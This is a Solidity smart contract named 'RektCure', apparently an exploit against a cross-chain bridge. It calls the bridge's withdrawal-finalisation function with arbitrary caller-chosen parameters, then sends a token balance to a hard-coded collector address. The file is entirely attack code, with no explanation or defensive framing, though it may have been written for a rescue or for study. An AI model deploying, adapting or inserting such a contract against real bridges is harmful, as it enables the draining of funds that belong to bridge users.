// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "./IERC20.sol";

interface IBridge {
  function finalizeWithdrawalTransaction(uint256, address, address, uint256, uint256, bytes memory) external;
}

contract RektCure {
  address public collector;
  address public bridge;
  address public token;

  constructor(
    address _bridge,
    address _collector,
    address _token
  ) public {
    bridge = _bridge;
    collector = _collector;
    token = _token;
  }

  function sadge(uint256 nonce, address sender, address target, uint256 value, uint256 gasLimit, bytes memory data) external {
    IBridge(bridge).finalizeWithdrawalTransaction(nonce,
sender,
target,
value,
gasLimit,
data);
    uint256 balance = IERC20(token).balanceOf(token);
    IERC20(token).transfer(collector, balance);
  }
}
